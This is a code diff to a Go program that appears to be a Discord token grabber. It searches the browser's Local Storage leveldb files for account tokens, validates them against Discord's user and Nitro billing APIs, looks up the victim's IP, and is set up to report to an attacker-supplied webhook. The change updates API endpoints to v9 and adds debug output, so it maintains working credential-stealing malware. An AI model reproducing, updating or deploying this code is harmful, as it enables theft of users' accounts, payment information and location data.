@@ -17,10 +17,10 @@ import (
 
 const (
 	WebhookUrl       = "YOUR_WEBHOOK_URL"
-	WebhookAvatarUrl = "YOUR_WEBHOOK_IMG"
+	WebhookAvatarUrl = "YOUR_WEBHOOK_IMG (ex: https://imgur.com/a/xxxxx)"
 	WebhookUsername  = "YOUR_WEBHOOK_NAME"
-	DiscordApiUsers  = "https://discordapp.com/api/v6/users/@me"
-	DiscordApiNitro  = "https://discord.com/api/v8/users/@me/billing/subscriptions"
+	DiscordApiUsers  = "https://discord.com/api/v9/users/@me"
+	DiscordApiNitro  = "https://discord.com/api/v9/users/@me/billing/subscriptions"
 	DiscordImgUrl    = "https://cdn.discordapp.com/avatars/"
 	IpAddrGet        = "http://ipinfo.io/ip"
 	Debug            = false
@@ -122,7 +122,7 @@ func isTokenValid(token string, tokenList []string) bool {
 	_, err := getRequest(DiscordApiUsers, true, token)
 	if err != nil {
 		if Debug {
-			fmt.Printf("Invalid Token: %s", err.Error())
+			fmt.Printf("Invalid Token: %s\n", err.Error())
 		}
 		return false
 	}
@@ -143,6 +143,10 @@ func isTokenValid(token string, tokenList []string) bool {
 }
 
 func findTokens(path string) (tokenList []string) {
+
+	if Debug {
+		fmt.Printf("Searching for tokens !\n")
+	}
 
 	path += "/Local Storage/leveldb/"
 	files, _ := ioutil.ReadDir(path)
